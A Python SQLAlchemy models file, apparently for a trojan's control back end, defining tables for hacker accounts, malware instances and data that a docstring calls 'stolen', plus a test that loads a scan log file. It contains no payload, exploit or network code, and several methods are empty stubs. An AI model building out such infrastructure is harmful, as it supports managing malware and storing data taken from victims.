from sqlalchemy import create_engine, MetaData, Table, Column, String, Boolean, DateTime, ForeignKey
from sqlalchemy.orm import sessionmaker, relationship, declarative_base
from werkzeug.security import generate_password_hash, check_password_hash
import uuid
import os
from datetime import datetime

dbPath = os.path.abspath('trojan.db')

print(f"dbPath: {dbPath}")

Base = declarative_base()
engine = create_engine(f'sqlite:///{dbPath}')
Session = sessionmaker(bind=engine)

session = Session()

class Hacker(Base): 

    __tablename__ = 'Hacker' 

    id = Column(String(60), primary_key=True, default=lambda: str(uuid.uuid4())) 
    name = Column(String(60)) 
    email = Column(String(60), unique=True) 
    password = Column(String(255)) 

    def check_password(self, password): 
        return check_password_hash(self.password, password) 
    
    @staticmethod 
    def create(name, email, password): 

        """Register a new hacker.""" 
        try: 
            password_hash = generate_password_hash(password) # Hash the password for security 

            hacker = Hacker(name=name, email=email, password=password_hash) 
            Session = sessionmaker(bind=engine) 

            session = Session() 
            session.add(hacker) 
            session.commit() 

            print(f'Hacker created: {hacker}') 

            all_hackers = session.query(Hacker).all() 

            print("All Hackers:", [h.__dict__ for h in all_hackers]) 

            return hacker 
        
        except Exception as e: 
            print(f"Error creating hacker: {e}") 
            return None
        finally:
            session.close()
    
    @staticmethod 
    def read(hacker_email): 

        """Read a hacker's details by ID.""" 
        
        try: 
             
            hacker = session.query(Hacker).filter_by(email=hacker_email).first()
            
            if hacker: 
                print(f'Hacker details: {hacker.__dict__}') 
                return hacker
            else: 
                print(f'Hacker with email {hacker_email} not found.') 
                return None 
        except Exception as e: print(f"Error reading hacker: {e}")
        
        finally:
            session.close()

    @staticmethod
    def update(name=None, hacker_email=None, password=None):
        """
        Update a hacker's details by ID.
        """
        try:
            
            # Query for the hacker
            hacker = session.query(Hacker).filter_by(email=hacker_email).first()

            if hacker:
                # Update fields if provided
                if name:
                    hacker.name = name
                if hacker_email:
                    hacker.email = hacker_email
                if password:
                    hacker.password = generate_password_hash(password)

                # Commit the updates
                session.commit()

                print(f"Hacker updated: {hacker}")

            else:
                print(f"Hacker with email {hacker_email} not found.")
        except Exception as e:
            session.rollback()
            print(f"Error updating hacker: {e}")

        finally:
            session.close()

    
    @staticmethod 
    def delete(hacker_email): 
        """Delete a hacker by ID.""" 

        try: 
                        
            hacker = session.query(Hacker).filter_by(email=hacker_email).first() 

            if hacker: 
                session.delete(hacker) 
                session.commit() 
                print(f'Hacker deleted: {hacker}') 

            else: 
                print(f'Hacker with email {hacker_email} not found.') 
                
        except Exception as e: print(f"Error deleting hacker: {e}")
        finally:
            session.close()


class InstanceData(Base):
    
    __tablename__ = 'InstanceData'

    malware_id = Column(String, ForeignKey('Malware.instance_id'),primary_key=True)
    data_id = Column(String, ForeignKey('Data.data_id'), primary_key=True)

    malware = relationship("Malware", back_populates="instances")
    data = relationship("Data", back_populates="instances")


class Malware(Base):
    
    __tablename__ = 'Malware'

    instance_id = Column(String, primary_key=True,default=lambda:str(uuid.uuid4()))
    created_at = Column(DateTime)
    status = Column(String, default='inactive')

    instances = relationship(
        "InstanceData", 
        back_populates="malware"
    )

    @classmethod
    def create(cls):
        malware = cls(created_at=datetime.today(), status='inactive')
        session.add(malware)
        session.commit()
        return malware
    
    def read():
        pass
    
    def update():
        pass   
    
    def delete():
        pass

class Data(Base):
    
    __tablename__ = 'Data'

    data_id = Column(String, primary_key=True, default=lambda: str(uuid.uuid4()))
    content = Column(String(255))
    source = Column(String(255))
    
    instances = relationship(
        "InstanceData", 
        back_populates="data"
    )


    def __init__(self, data_id=None, content=None, source=None):
        self.data_id = data_id
        self.content = content
        self.source = source

    @staticmethod 
    def read_data_from_file(file):
        """
        Purpose: Read stolen data from a file and save it to the Data table.
        
        Parameters:
            file (str): Path to the file containing the data to be saved.
            source (str): Source or description of the data.
        
        Returns:
            dict: Status of the operation.
        """
        try:
            # Resolve absolute file path
            filePath = os.path.abspath(file)
            
            # Read the file content
            with open(filePath, 'r') as f:
                content = f.read()

            # Create a Data object
            data_entry = Data(
                data_id=str(uuid.uuid4()),
                content=content,
                source=filePath
            )
            
            # Save the data to the database
            session.add(data_entry)
            session.commit()
            
            print(f"Data saved successfully: {data_entry}")
            return {"status": "success", "message": "Data saved successfully."}
        
        except Exception as e:
            session.rollback()  # Roll back in case of error
            print(f"Error saving data: {e}")
            return {"status": "error", "message": str(e)}

        finally:
            session.close()
    
    @staticmethod 
    def read(): 

        """Read data""" 
        
        try:
            data = session.query(Data).all()  # This returns a list of Data objects
            if data:
                return data  # Ensure it's a list of Data objects
            else:
                return []  # Return an empty list if no data is found
        except Exception as e:
            print(f"Error reading data: {e}")
            return []  # Return an empty list if an error occurs
        finally:
            session.close()
    
    def update():
        pass
    
    def delete():
        pass

#lines 237 to 241 are meant for testing Data class
data = Data()
read = data.read_data_from_file('system_scan_log.json')
if read:

    data.read()

# Create the table 
Base.metadata.create_all(engine)
    


